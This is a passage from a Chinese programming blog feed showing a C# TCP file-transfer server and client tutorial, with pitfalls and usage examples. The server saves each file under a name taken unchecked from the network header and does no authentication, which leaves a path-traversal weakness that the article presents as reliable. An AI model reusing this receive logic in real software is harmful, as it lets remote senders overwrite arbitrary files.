            <span class="hljs-keyword">catch</span> (ObjectDisposedException)
            {
                <span class="hljs-comment">// 服务器已停止，正常情况</span>
            }
            <span class="hljs-keyword">catch</span> (Exception ex)
            {
                OnStatusChanged(<span class="hljs-string">$"等待客户端连接时出错: <span class="hljs-subst">{ex.Message}</span>"</span>, <span class="hljs-literal">true</span>);
            }
        }

        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">HandleClientAsync</span>()</span>
        {
            <span class="hljs-keyword">try</span>
            {
                <span class="hljs-keyword">while</span> (_isRunning &amp;&amp; _isClientConnected &amp;&amp; !_cancellationTokenSource.Token.IsCancellationRequested)
                {
                    <span class="hljs-comment">// 等待接收文件头信息</span>
                    <span class="hljs-keyword">var</span> headerBuffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[HeaderSize];
                    <span class="hljs-keyword">var</span> totalRead = <span class="hljs-number">0</span>;
                    <span class="hljs-keyword">while</span> (totalRead &lt; HeaderSize)
                    {
                        <span class="hljs-keyword">var</span> bytesRead = <span class="hljs-keyword">await</span> _stream.ReadAsync(headerBuffer, totalRead, HeaderSize - totalRead, _cancellationTokenSource.Token);
                        <span class="hljs-keyword">if</span> (bytesRead == <span class="hljs-number">0</span>)
                        {
                            OnStatusChanged(<span class="hljs-string">"客户端断开连接"</span>);
                            _isClientConnected = <span class="hljs-literal">false</span>;
                            <span class="hljs-keyword">return</span>;
                        }
                        totalRead += bytesRead;
                    }
                    <span class="hljs-keyword">var</span> headerInfo = ParseFileHeader(headerBuffer);
                    <span class="hljs-keyword">if</span> (headerInfo.Command == <span class="hljs-string">"SEND"</span>)
                    {
                        <span class="hljs-keyword">await</span> ReceiveFileFromClientAsync(headerInfo);
                    }
                    <span class="hljs-keyword">else</span>
                    {
                        OnStatusChanged(<span class="hljs-string">$"收到未知命令: <span class="hljs-subst">{headerInfo.Command}</span>"</span>, <span class="hljs-literal">true</span>);
                        <span class="hljs-comment">// 发送错误响应</span>
                        <span class="hljs-keyword">var</span> errorBytes = Encoding.UTF8.GetBytes(<span class="hljs-string">"ERR"</span>);
                        <span class="hljs-keyword">await</span> _stream.WriteAsync(errorBytes, <span class="hljs-number">0</span>, errorBytes.Length, _cancellationTokenSource.Token);
                    }
                }
            }
            <span class="hljs-keyword">catch</span> (Exception ex)
            {
                OnStatusChanged(<span class="hljs-string">$"处理客户端请求时出错: <span class="hljs-subst">{ex.Message}</span>"</span>, <span class="hljs-literal">true</span>);
                _isClientConnected = <span class="hljs-literal">false</span>;
            }
        }

        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ReceiveFileFromClientAsync</span>(<span class="hljs-params">(<span class="hljs-built_in">string</span> Command, <span class="hljs-built_in">string</span> FileName, <span class="hljs-built_in">long</span> FileSize, DateTime Timestamp</span>) headerInfo)</span>
        {
            <span class="hljs-keyword">try</span>
            {
                <span class="hljs-comment">// 确保保存目录存在</span>
                <span class="hljs-keyword">if</span> (!Directory.Exists(SaveDirectory))
                {
                    Directory.CreateDirectory(SaveDirectory);
                }
                <span class="hljs-comment">// 构造完整的文件路径</span>
                <span class="hljs-keyword">var</span> localFilePath = Path.Combine(SaveDirectory, headerInfo.FileName);
                <span class="hljs-comment">// 如果文件已存在，添加时间戳后缀</span>
                <span class="hljs-keyword">if</span> (File.Exists(localFilePath))
                {
                    <span class="hljs-keyword">var</span> fileInfo = <span class="hljs-keyword">new</span> FileInfo(localFilePath);
                    <span class="hljs-keyword">var</span> nameWithoutExt = Path.GetFileNameWithoutExtension(fileInfo.Name);
                    <span class="hljs-keyword">var</span> extension = fileInfo.Extension;
                    <span class="hljs-keyword">var</span> timestamp = DateTime.Now.ToString(<span class="hljs-string">"yyyyMMdd_HHmmss"</span>);
                    localFilePath = Path.Combine(SaveDirectory, <span class="hljs-string">$"<span class="hljs-subst">{nameWithoutExt}</span>_<span class="hljs-subst">{timestamp}</span><span class="hljs-subst">{extension}</span>"</span>);
                }
                OnStatusChanged(<span class="hljs-string">$"开始接收文件: <span class="hljs-subst">{headerInfo.FileName}</span> (<span class="hljs-subst">{FormatBytes(headerInfo.FileSize)}</span>)"</span>);
                <span class="hljs-comment">// 发送确认响应</span>
                <span class="hljs-keyword">var</span> confirmBytes = Encoding.UTF8.GetBytes(<span class="hljs-string">"OK"</span>);
                <span class="hljs-keyword">await</span> _stream.WriteAsync(confirmBytes, <span class="hljs-number">0</span>, confirmBytes.Length, _cancellationTokenSource.Token);
                <span class="hljs-comment">// 在开始接收前触发开始事件，让UI设置开始时间</span>
                OnTransferStarted(headerInfo.FileName, headerInfo.FileSize);
                <span class="hljs-comment">// 接收文件内容</span>
                <span class="hljs-keyword">using</span> (<span class="hljs-keyword">var</span> fileStream = <span class="hljs-keyword">new</span> FileStream(localFilePath, FileMode.Create, FileAccess.Write))
                {
                    <span class="hljs-keyword">var</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[BufferSize];
                    <span class="hljs-built_in">long</span> totalReceived = <span class="hljs-number">0</span>;
                    <span class="hljs-built_in">int</span> bytesRead;
                    <span class="hljs-keyword">while</span> (totalReceived &lt; headerInfo.FileSize)
                    {
                        <span class="hljs-keyword">var</span> remainingBytes = headerInfo.FileSize - totalReceived;
                        <span class="hljs-keyword">var</span> bytesToRead = (<span class="hljs-built_in">int</span>)Math.Min(buffer.Length, remainingBytes);
                        bytesRead = <span class="hljs-keyword">await</span> _stream.ReadAsync(buffer, <span class="hljs-number">0</span>, bytesToRead, _cancellationTokenSource.Token);
                        <span class="hljs-keyword">if</span> (bytesRead == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;
                        <span class="hljs-keyword">await</span> fileStream.WriteAsync(buffer, <span class="hljs-number">0</span>, bytesRead, _cancellationTokenSource.Token);
                        totalReceived += bytesRead;
                        OnProgressChanged(totalReceived, headerInfo.FileSize, headerInfo.FileName);
                        <span class="hljs-keyword">if</span> (_cancellationTokenSource.Token.IsCancellationRequested)
                            <span class="hljs-keyword">break</span>;
                    }
                }
                OnStatusChanged(<span class="hljs-string">$"文件接收完成: <span class="hljs-subst">{Path.GetFileName(localFilePath)}</span> -&gt; <span class="hljs-subst">{localFilePath}</span>"</span>);
            }
            <span class="hljs-keyword">catch</span> (Exception ex)
            {
                OnStatusChanged(<span class="hljs-string">$"接收文件失败: <span class="hljs-subst">{ex.Message}</span>"</span>, <span class="hljs-literal">true</span>);
                <span class="hljs-comment">// 发送错误响应</span>
                <span class="hljs-keyword">try</span>
                {
                    <span class="hljs-keyword">var</span> errorBytes = Encoding.UTF8.GetBytes(<span class="hljs-string">"ERR"</span>);
                    <span class="hljs-keyword">await</span> _stream.WriteAsync(errorBytes, <span class="hljs-number">0</span>, errorBytes.Length, _cancellationTokenSource.Token);
                }
                <span class="hljs-keyword">catch</span> { }
            }
        }

        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Stop</span>()</span>
        {
            <span class="hljs-keyword">try</span>
            {
                _isRunning = <span class="hljs-literal">false</span>;
                _isClientConnected = <span class="hljs-literal">false</span>;
                _cancellationTokenSource?.Cancel();
                _stream?.Close();
                _client?.Close();
                _listener?.Stop();
                OnStatusChanged(<span class="hljs-string">"服务器已停止"</span>);
            }
            <span class="hljs-keyword">catch</span> (Exception ex)
            {
                OnStatusChanged(<span class="hljs-string">$"停止服务器时出错: <span class="hljs-subst">{ex.Message}</span>"</span>, <span class="hljs-literal">true</span>);
            }
        }

        <span class="hljs-keyword">private</span> (<span class="hljs-built_in">string</span> Command, <span class="hljs-built_in">string</span> FileName, <span class="hljs-built_in">long</span> FileSize, DateTime Timestamp) ParseFileHeader(<span class="hljs-built_in">byte</span>[] header)
        {
            <span class="hljs-keyword">var</span> headerString = Encoding.UTF8.GetString(header).TrimEnd(<span class="hljs-string">'\0'</span>);
            <span class="hljs-keyword">var</span> parts = headerString.Split(<span class="hljs-string">'|'</span>);
            <span class="hljs-keyword">if</span> (parts.Length &gt;= <span class="hljs-number">4</span>)
            {
                <span class="hljs-keyword">return</span> (
                    Command: parts[<span class="hljs-number">0</span>],
                    FileName: parts[<span class="hljs-number">1</span>],
                    FileSize: <span class="hljs-built_in">long</span>.TryParse(parts[<span class="hljs-number">2</span>], <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> size) ? size : <span class="hljs-number">0</span>,
                    Timestamp: DateTime.TryParse(parts[<span class="hljs-number">3</span>], <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> time) ? time : DateTime.Now
                );
            }
            <span class="hljs-keyword">return</span> (<span class="hljs-string">"UNKNOWN"</span>, <span class="hljs-string">""</span>, <span class="hljs-number">0</span>, DateTime.Now);
        }

        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnTransferStarted</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> fileName, <span class="hljs-built_in">long</span> totalBytes</span>)</span>
        {
            TransferStarted?.Invoke(<span class="hljs-keyword">this</span>, <span class="hljs-keyword">new</span> TransferEventArgs(<span class="hljs-number">0</span>, totalBytes, fileName));
        }

        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnProgressChanged</span>(<span class="hljs-params"><span class="hljs-built_in">long</span> transferred, <span class="hljs-built_in">long</span> total, <span class="hljs-built_in">string</span> fileName</span>)</span>
        {
            ProgressChanged?.Invoke(<span class="hljs-keyword">this</span>, <span class="hljs-keyword">new</span> TransferEventArgs(transferred, total, fileName));
        }

        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnStatusChanged</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message, <span class="hljs-built_in">bool</span> isError = <span class="hljs-literal">false</span></span>)</span>
        {
            StatusChanged?.Invoke(<span class="hljs-keyword">this</span>, <span class="hljs-keyword">new</span> TransferEventArgs(message, isError));
        }

        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> <span class="hljs-title">FormatBytes</span>(<span class="hljs-params"><span class="hljs-built_in">long</span> bytes</span>)</span>
        {
            <span class="hljs-built_in">string</span>[] sizes = { <span class="hljs-string">"B"</span>, <span class="hljs-string">"KB"</span>, <span class="hljs-string">"MB"</span>, <span class="hljs-string">"GB"</span>, <span class="hljs-string">"TB"</span> };
            <span class="hljs-built_in">double</span> len = bytes;
            <span class="hljs-built_in">int</span> order = <span class="hljs-number">0</span>;
            <span class="hljs-keyword">while</span> (len &gt;= <span class="hljs-number">1024</span> &amp;&amp; order &lt; sizes.Length - <span class="hljs-number">1</span>)
            {
                order++;
                len = len / <span class="hljs-number">1024</span>;
            }
            <span class="hljs-keyword">return</span> <span class="hljs-string">$"<span class="hljs-subst">{len:<span class="hljs-number">0.</span>##}</span> <span class="hljs-subst">{sizes[order]}</span>"</span>;
        }
    }
}
</code></pre>
<h4 data-id="heading-5">客户端实现：专注发送文件</h4>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-keyword">using</span> System;
<span class="hljs-keyword">using</span> System.IO;
<span class="hljs-keyword">using</span> System.Net.Sockets;
<span class="hljs-keyword">using</span> System.Text;
<span class="hljs-keyword">using</span> System.Threading;
<span class="hljs-keyword">using</span> System.Threading.Tasks;
<span class="hljs-keyword">using</span> AppNetworkFileTransfer.Core;
<span class="hljs-keyword">using</span> AppNetworkFileTransfer.Models;

<span class="hljs-keyword">namespace</span> <span class="hljs-title">AppNetworkFileTransfer.Core</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">FileTransferClient</span>
    {
        <span class="hljs-keyword">private</span> TcpClient _client;
        <span class="hljs-keyword">private</span> NetworkStream _stream;
        <span class="hljs-keyword">private</span> <span class="hljs-built_in">bool</span> _isConnected = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">private</span> CancellationTokenSource _cancellationTokenSource;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">int</span> BufferSize = <span class="hljs-number">8192</span>;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">int</span> HeaderSize = <span class="hljs-number">1024</span>;

        <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;TransferEventArgs&gt; ProgressChanged;
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;TransferEventArgs&gt; StatusChanged;
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;TransferEventArgs&gt; TransferStarted;

        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ConnectAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> serverIP, <span class="hljs-built_in">int</span> port</span>)</span>
        {
            <span class="hljs-keyword">try</span>
            {
                _client = <span class="hljs-keyword">new</span> TcpClient();
                _cancellationTokenSource = <span class="hljs-keyword">new</span> CancellationTokenSource();
                <span class="hljs-keyword">await</span> _client.ConnectAsync(serverIP, port);
                _stream = _client.GetStream();
                _isConnected = <span class="hljs-literal">true</span>;
                OnStatusChanged(<span class="hljs-string">$"已连接到服务器 <span class="hljs-subst">{serverIP}</span>:<span class="hljs-subst">{port}</span>"</span>);
            }
            <span class="hljs-keyword">catch</span> (Exception ex)
            {
                OnStatusChanged(<span class="hljs-string">$"连接服务器失败: <span class="hljs-subst">{ex.Message}</span>"</span>, <span class="hljs-literal">true</span>);
                <span class="hljs-keyword">throw</span>;
            }
        }

        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Disconnect</span>()</span>
        {
            <span class="hljs-keyword">try</span>
            {
                _isConnected = <span class="hljs-literal">false</span>;
                _cancellationTokenSource?.Cancel();
                _stream?.Close();
                _client?.Close();
                OnStatusChanged(<span class="hljs-string">"已断开连接"</span>);
            }
            <span class="hljs-keyword">catch</span> (Exception ex)
            {
                OnStatusChanged(<span class="hljs-string">$"断开连接时出错: <span class="hljs-subst">{ex.Message}</span>"</span>, <span class="hljs-literal">true</span>);
            }
        }

        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">SendFileAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> localFilePath</span>)</span>
        {
            <span class="hljs-keyword">if</span> (!_isConnected || _stream == <span class="hljs-literal">null</span>)
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidOperationException(<span class="hljs-string">"未连接到服务器"</span>);
            <span class="hljs-keyword">if</span> (!File.Exists(localFilePath))
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FileNotFoundException(<span class="hljs-string">$"文件不存在: <span class="hljs-subst">{localFilePath}</span>"</span>);

            <span class="hljs-keyword">try</span>
            {
                <span class="hljs-keyword">var</span> fileInfo = <span class="hljs-keyword">new</span> FileInfo(localFilePath);
                <span class="hljs-keyword">var</span> fileName = fileInfo.Name;
                OnStatusChanged(<span class="hljs-string">$"开始发送文件: <span class="hljs-subst">{fileName}</span> (<span class="hljs-subst">{FormatBytes(fileInfo.Length)}</span>)"</span>);
                <span class="hljs-comment">// 触发传输开始事件</span>
                OnTransferStarted(fileName, fileInfo.Length);
                <span class="hljs-comment">// 发送文件头信息</span>
                <span class="hljs-keyword">var</span> header = CreateFileHeader(<span class="hljs-string">"SEND"</span>, fileName, fileInfo.Length);
                <span class="hljs-keyword">await</span> _stream.WriteAsync(header, <span class="hljs-number">0</span>, header.Length, _cancellationTokenSource.Token);
                <span class="hljs-comment">// 等待服务器确认</span>
                <span class="hljs-keyword">var</span> response = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[<span class="hljs-number">4</span>];
                <span class="hljs-keyword">await</span> _stream.ReadAsync(response, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, _cancellationTokenSource.Token);
                <span class="hljs-keyword">var</span> responseStr = Encoding.UTF8.GetString(response).TrimEnd(<span class="hljs-string">'\0'</span>);
                <span class="hljs-keyword">if</span> (responseStr != <span class="hljs-string">"OK"</span>)
                {
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">$"服务器响应错误: <span class="hljs-subst">{responseStr}</span>"</span>);
                }
                <span class="hljs-comment">// 发送文件内容</span>
                <span class="hljs-keyword">using</span> (<span class="hljs-keyword">var</span> fileStream = <span class="hljs-keyword">new</span> FileStream(localFilePath, FileMode.Open, FileAccess.Read))
                {
                    <span class="hljs-keyword">var</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[BufferSize];
                    <span class="hljs-built_in">long</span> totalSent = <span class="hljs-number">0</span>;
                    <span class="hljs-built_in">int</span> bytesRead;
                    <span class="hljs-keyword">while</span> ((bytesRead = <span class="hljs-keyword">await</span> fileStream.ReadAsync(buffer, <span class="hljs-number">0</span>, buffer.Length, _cancellationTokenSource.Token)) &gt; <span class="hljs-number">0</span>)
                    {
                        <span class="hljs-keyword">await</span> _stream.WriteAsync(buffer, <span class="hljs-number">0</span>, bytesRead, _cancellationTokenSource.Token);
                        totalSent += bytesRead;
                        OnProgressChanged(totalSent, fileInfo.Length, fileName);
                        <span class="hljs-keyword">if</span> (_cancellationTokenSource.Token.IsCancellationRequested)
                            <span class="hljs-keyword">break</span>;
                    }
                }
                OnStatusChanged(<span class="hljs-string">$"文件发送完成: <span class="hljs-subst">{fileName}</span>"</span>);
            }
            <span class="hljs-keyword">catch</span> (Exception ex)
            {
                OnStatusChanged(<span class="hljs-string">$"发送文件失败: <span class="hljs-subst">{ex.Message}</span>"</span>, <span class="hljs-literal">true</span>);
                <span class="hljs-keyword">throw</span>;
            }
        }

        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">byte</span>[] <span class="hljs-title">CreateFileHeader</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> command, <span class="hljs-built_in">string</span> fileName, <span class="hljs-built_in">long</span> fileSize</span>)</span>
        {
            <span class="hljs-keyword">var</span> header = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[HeaderSize];
            <span class="hljs-keyword">var</span> headerString = <span class="hljs-string">$"<span class="hljs-subst">{command}</span>|<span class="hljs-subst">{fileName}</span>|<span class="hljs-subst">{fileSize}</span>|<span class="hljs-subst">{DateTime.Now:yyyy-MM-dd HH:mm:ss}</span>"</span>;
            <span class="hljs-keyword">var</span> headerBytes = Encoding.UTF8.GetBytes(headerString);
            Array.Copy(headerBytes, <span class="hljs-number">0</span>, header, <span class="hljs-number">0</span>, Math.Min(headerBytes.Length, HeaderSize));
            <span class="hljs-keyword">return</span> header;
        }

        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnTransferStarted</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> fileName, <span class="hljs-built_in">long</span> totalBytes</span>)</span>
        {
            TransferStarted?.Invoke(<span class="hljs-keyword">this</span>, <span class="hljs-keyword">new</span> TransferEventArgs(<span class="hljs-number">0</span>, totalBytes, fileName));
        }

        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnProgressChanged</span>(<span class="hljs-params"><span class="hljs-built_in">long</span> transferred, <span class="hljs-built_in">long</span> total, <span class="hljs-built_in">string</span> fileName</span>)</span>
        {
            ProgressChanged?.Invoke(<span class="hljs-keyword">this</span>, <span class="hljs-keyword">new</span> TransferEventArgs(transferred, total, fileName));
        }

        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnStatusChanged</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message, <span class="hljs-built_in">bool</span> isError = <span class="hljs-literal">false</span></span>)</span>
        {
            StatusChanged?.Invoke(<span class="hljs-keyword">this</span>, <span class="hljs-keyword">new</span> TransferEventArgs(message, isError));
        }

        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> <span class="hljs-title">FormatBytes</span>(<span class="hljs-params"><span class="hljs-built_in">long</span> bytes</span>)</span>
        {
            <span class="hljs-built_in">string</span>[] sizes = { <span class="hljs-string">"B"</span>, <span class="hljs-string">"KB"</span>, <span class="hljs-string">"MB"</span>, <span class="hljs-string">"GB"</span>, <span class="hljs-string">"TB"</span> };
            <span class="hljs-built_in">double</span> len = bytes;
            <span class="hljs-built_in">int</span> order = <span class="hljs-number">0</span>;
            <span class="hljs-keyword">while</span> (len &gt;= <span class="hljs-number">1024</span> &amp;&amp; order &lt; sizes.Length - <span class="hljs-number">1</span>)
            {
                order++;
                len = len / <span class="hljs-number">1024</span>;
            }
            <span class="hljs-keyword">return</span> <span class="hljs-string">$"<span class="hljs-subst">{len:<span class="hljs-number">0.</span>##}</span> <span class="hljs-subst">{sizes[order]}</span>"</span>;
        }
    }
}
</code></pre>
<h4 data-id="heading-6">UI设计与常见坑点处理</h4>
<p>智能模式切换逻辑：</p>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">cmbMode_SelectedIndexChanged</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sender, EventArgs e</span>)</span>
{
    _isServer = cmbMode.SelectedIndex == <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// 动态显示对应功能区域</span>
    grpServerSettings.Visible = _isServer;
    grpClientSettings.Visible = !_isServer;
    
    <span class="hljs-comment">// 智能IP设置</span>
    <span class="hljs-keyword">if</span> (_isServer)
        txtServerIP.Text = GetLocalIPAddress();
    <span class="hljs-keyword">else</span>
        txtServerIP.Text = <span class="hljs-string">"127.0.0.1"</span>;
        
    UpdateTransferControls();
}
</code></pre>
<p><strong>常见坑点提醒：</strong></p>
<p>1、TimeSpan溢出问题</p>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnProgressChanged</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sender, TransferEventArgs e</span>)</span>
{
    <span class="hljs-comment">// 坑点：传输初期速度计算可能导致TimeSpan溢出</span>
    <span class="hljs-keyword">var</span> elapsed = DateTime.Now - _transferStartTime;
    
    <span class="hljs-keyword">if</span> (elapsed.TotalSeconds &gt;= <span class="hljs-number">1.0</span>) <span class="hljs-comment">// 关键：等待足够时间</span>
    {
        <span class="hljs-keyword">var</span> speed = _transferredBytes / elapsed.TotalSeconds;
        <span class="hljs-keyword">var</span> remainingSeconds = remainingBytes / speed;
        
        <span class="hljs-comment">// 防溢出处理</span>
        <span class="hljs-keyword">if</span> (remainingSeconds &gt; <span class="hljs-number">0</span> &amp;&amp; remainingSeconds &lt;= TimeSpan.MaxValue.TotalSeconds)
        {
            <span class="hljs-keyword">if</span> (remainingSeconds &gt; <span class="hljs-number">3600</span> * <span class="hljs-number">999</span>) <span class="hljs-comment">// 限制最大显示时间</span>
                lblTimeRemainingValue.Text = <span class="hljs-string">"&gt; 999小时"</span>;
            <span class="hljs-keyword">else</span>
                lblTimeRemainingValue.Text = FormatTime(TimeSpan.FromSeconds(remainingSeconds));
        }
    }
}
</code></pre>
<p>2、网络异常处理</p>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-comment">// 坑点：网络中断时要优雅处理</span>
<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">HandleClientAsync</span>()</span>
{
    <span class="hljs-keyword">try</span>
    {
        <span class="hljs-keyword">while</span> (_isRunning &amp;&amp; _isClientConnected)
        {
            <span class="hljs-keyword">var</span> headerBuffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[HeaderSize];
            <span class="hljs-keyword">var</span> totalRead = <span class="hljs-number">0</span>;
            
            <span class="hljs-comment">// 关键：确保完整读取header</span>
            <span class="hljs-keyword">while</span> (totalRead &lt; HeaderSize)
            {
                <span class="hljs-keyword">var</span> bytesRead = <span class="hljs-keyword">await</span> _stream.ReadAsync(headerBuffer, totalRead, 
                    HeaderSize - totalRead, _cancellationTokenSource.Token);
                    
                <span class="hljs-keyword">if</span> (bytesRead == <span class="hljs-number">0</span>) <span class="hljs-comment">// 客户端断开</span>
                {
                    OnStatusChanged(<span class="hljs-string">"客户端断开连接"</span>);
                    <span class="hljs-keyword">return</span>;
                }
                totalRead += bytesRead;
            }
        }
    }
    <span class="hljs-keyword">catch</span> (Exception ex)
    {
        OnStatusChanged(<span class="hljs-string">$"网络异常: <span class="hljs-subst">{ex.Message}</span>"</span>, <span class="hljs-literal">true</span>);
    }
}
</code></pre>
<p>运行效果如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89e0a14457e24d2fb967fc88faee989e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP56CB57yW5Yyg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765612129&amp;x-signature=2%2B39fsJ9iES8N6yLmUBWQnT2GUs%3D" alt="" title="null" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3022e65c49c1445bbf1c267f2e6e705c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP56CB57yW5Yyg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765612129&amp;x-signature=in69w2HH%2FQ6IVfERbv%2BOHzR4%2FfM%3D" alt="" title="null" loading="lazy"/></p>
<h4 data-id="heading-7">企业内网文件同步</h4>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-comment">// 批量文件传输示例</span>
<span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> filePath <span class="hljs-keyword">in</span> Directory.GetFiles(sourceDirectory))
{
    <span class="hljs-keyword">await</span> client.SendFileAsync(filePath);
    <span class="hljs-keyword">await</span> Task.Delay(<span class="hljs-number">100</span>); <span class="hljs-comment">// 避免网络拥塞</span>
}
</code></pre>
<h4 data-id="heading-8">自动备份系统集成</h4>
<pre><code class="hljs language-cs" lang="cs"><span class="hljs-comment">// 定时备份集成</span>
<span class="hljs-keyword">var</span> timer = <span class="hljs-keyword">new</span> System.Timers.Timer(TimeSpan.FromHours(<span class="hljs-number">6</span>).TotalMilliseconds);
timer.Elapsed += <span class="hljs-keyword">async</span> (s, e) =&gt;
{
    <span class="hljs-keyword">var</span> backupFiles = GetBackupFiles();
    <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> file <span class="hljs-keyword">in</span> backupFiles)
    {
        <span class="hljs-keyword">await</span> client.SendFileAsync(file);
    }
};
</code></pre>
<h3 data-id="heading-9">总结</h3>
<p>通过本次实战，我们成功打造了一个职责清晰、稳定可靠的网络文件传输工具。整个方案坚持三个关键设计原则：</p>
<p>1、职责分离：服务端专注接收，客户端专注发送，避免功能臃肿<br/>
2、异步处理：全程使用async/await，确保UI响应和传输效率<br/>
3、异常兜底：TimeSpan溢出、网络中断等边界情况的优雅处理</p>
<p>同时，两个实用技巧也值得借鉴：</p>
<ul>
<li>智能重命名：自动处理文件名冲突，避免覆盖重要数据</li>
<li>进度可视化：实时速度计算和剩余时间估算，提升用户体验</li>
</ul>
<p>这套方案已在多个工业场景中稳定运行，无论是作为独立工具，还是嵌入到更大的系统中，都能胜任文件传输的核心任务。</p>
<h3 data-id="heading-10">关键词</h3>
<p>C#、文件传输、TCP、服务端、客户端、异步编程、WinForm、工业应用、网络通信、进度显示</p>
<blockquote>
<p>mp.weixin.qq.com/s/qjrx0m98ZG2mZQ0MSA_pPQ</p>
</blockquote>
<h3 data-id="heading-11">最后</h3>
<p>如果你觉得这篇文章对你有帮助，不妨点个赞支持一下！你的支持是我继续分享知识的动力。如果有任何疑问或需要进一步的帮助，欢迎随时留言。</p>
<p>也可以加入微信公众号 <strong>[DotNet技术匠]</strong> 社区，与其他热爱技术的同行一起交流心得，共同成长！</p>
<p><strong>优秀是一种习惯，欢迎大家留言学习！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[.NET进阶——深入理解反射（2）细说Type类型与实例创建]]></title>    <link>https://juejin.cn/post/7580285196692733952</link>    <guid>https://juejin.cn/post/7580285196692733952</guid>    <pubDate>2025-12-06T07:53:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580285196692733952" data-draft-id="7580278296837079074" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=".NET进阶——深入理解反射（2）细说Type类型与实例创建"/> <meta itemprop="keywords" content=".NET"/> <meta itemprop="datePublished" content="2025-12-06T07:53:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="我要拿微软MVP"/> <meta itemprop="url" content="https://juejin.cn/user/1945461219656633"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" 